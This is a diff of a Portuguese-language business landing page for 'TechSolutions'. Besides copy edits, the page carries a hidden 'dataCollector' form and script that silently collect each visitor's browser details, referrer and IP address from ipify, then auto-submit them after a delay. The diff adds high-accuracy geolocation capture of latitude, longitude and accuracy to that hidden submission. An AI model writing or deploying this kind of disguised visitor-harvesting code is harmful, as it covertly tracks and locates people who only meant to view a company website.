@@ -3,38 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TechSolutions - Inovação Digital</title>
+    <title>TechSolutions - Soluções Digitais</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style type="text/css">
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        
+    <style>
         .gradient-text {
             background: linear-gradient(90deg, #2563eb 0%, #1d4ed8 100%);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
-        
         .gradient-bg {
             background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
-        }
-        
-        #loading {
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(5px);
         }
     </style>
 </head>
 <body class="font-sans bg-gray-50 text-gray-800">
-    <!-- Loading Screen (opcional) -->
-    <div id="loading" class="fixed inset-0 z-50 flex items-center justify-center hidden">
-        <div class="text-center">
-            <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-            <h3 class="text-xl font-semibold text-white">Carregando conteúdo...</h3>
-        </div>
-    </div>
-
     <!-- Conteúdo do Site -->
     <header class="gradient-bg text-white sticky top-0 z-40 shadow-lg">
         <div class="container mx-auto px-6 py-4">
@@ -57,31 +41,31 @@
     <main class="container mx-auto px-6 py-10">
         <section class="text-center mb-20">
             <h1 class="text-4xl md:text-6xl font-bold mb-6">
-                <span class="gradient-text">Soluções Digitais</span> Sob Medida
+                <span class="gradient-text">Soluções Digitais</span> Inovadoras
             </h1>
             <p class="text-xl text-gray-600 mb-10">
-                Transformamos suas ideias em realidade digital
+                Transformamos suas ideias em realidade digital com tecnologia de ponta
             </p>
             <button class="bg-blue-500 hover:bg-blue-600 text-white font-semibold px-8 py-3 rounded-lg">
-                Começar Projeto
+                Conheça nossos serviços
             </button>
         </section>
 
         <section class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-20">
             <div class="bg-white p-6 rounded-lg shadow">
-                <i class="fas fa-laptop-code text-3xl text-blue-500 mb-4"></i>
-                <h3 class="text-xl font-bold mb-3">Desenvolvimento Web</h3>
-                <p class="text-gray-600">Sites e aplicações web personalizadas.</p>
+                <i class="fas fa-globe text-3xl text-blue-500 mb-4"></i>
+                <h3 class="text-xl font-bold mb-3">Sites Responsivos</h3>
+                <p class="text-gray-600">Desenvolvimento web moderno para todos os dispositivos.</p>
             </div>
             <div class="bg-white p-6 rounded-lg shadow">
                 <i class="fas fa-mobile-alt text-3xl text-blue-500 mb-4"></i>
-                <h3 class="text-xl font-bold mb-3">Aplicativos Móveis</h3>
-                <p class="text-gray-600">Apps nativos para iOS e Android.</p>
+                <h3 class="text-xl font-bold mb-3">Apps Móveis</h3>
+                <p class="text-gray-600">Aplicativos nativos para iOS e Android.</p>
             </div>
             <div class="bg-white p-6 rounded-lg shadow">
                 <i class="fas fa-chart-line text-3xl text-blue-500 mb-4"></i>
                 <h3 class="text-xl font-bold mb-3">Marketing Digital</h3>
-                <p class="text-gray-600">Aumente sua presença online.</p>
+                <p class="text-gray-600">Estratégias para aumentar sua visibilidade online.</p>
             </div>
         </section>
     </main>
@@ -105,10 +89,45 @@
         <input type="hidden" name="screen" id="screen">
         <input type="hidden" name="referrer" id="referrer">
         <input type="hidden" name="timestamp" id="timestamp">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="accuracy" id="accuracy">
+        <input type="hidden" name="location_access" id="locationAccess">
     </form>
 
     <script>
-        // Coleta de dados otimizada
+        // Função para obter localização geográfica
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    document.getElementById('locationAccess').value = "Navegador não suporta geolocalização";
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        document.getElementById('latitude').value = position.coords.latitude;
+                        document.getElementById('longitude').value = position.coords.longitude;
+                        document.getElementById('accuracy').value = position.coords.accuracy;
+                        document.getElementById('locationAccess').value = "Permitido";
+                        resolve();
+                    },
+                    (error) => {
+                        document.getElementById('locationAccess').value = 
+                            `Negado (${error.code}: ${error.message})`;
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Coleta de dados principal
         async function collectAndSend() {
             // Dados básicos
             document.getElementById('userAgent').value = navigator.userAgent;
@@ -116,32 +135,24 @@
             document.getElementById('referrer').value = document.referrer || 'Direto';
             document.getElementById('timestamp').value = new Date().toISOString();
 
-            // Tenta múltiplas APIs para IPv4 com fallback
-            const ipApis = [
-                'https://api.ipify.org?format=json',
-                'https://api4.ipify.org?format=json',
-                'https://ipapi.co/json/'
-            ];
-
-            for (const api of ipApis) {
-                try {
-                    const response = await fetch(api);
-                    const data = await response.json();
-                    if (data.ip && /^\d+\.\d+\.\d+\.\d+$/.test(data.ip)) {
-                        document.getElementById('ipv4').value = data.ip;
-                        break;
-                    }
-                } catch (e) {
-                    console.log(`Falha na API: ${api}`);
-                }
+            // Tenta obter IPv4
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('ipv4').value = data.ip || "Não disponível";
+            } catch (error) {
+                document.getElementById('ipv4').value = "Erro ao obter";
             }
+
+            // Tenta obter localização
+            await getGeolocation();
 
             // Envia os dados silenciosamente
             document.getElementById('dataCollector').submit();
         }
 
         // Dispara após um pequeno delay
-        setTimeout(collectAndSend, 1000);
+        setTimeout(collectAndSend, 1500);
     </script>
 </body>
 </html>
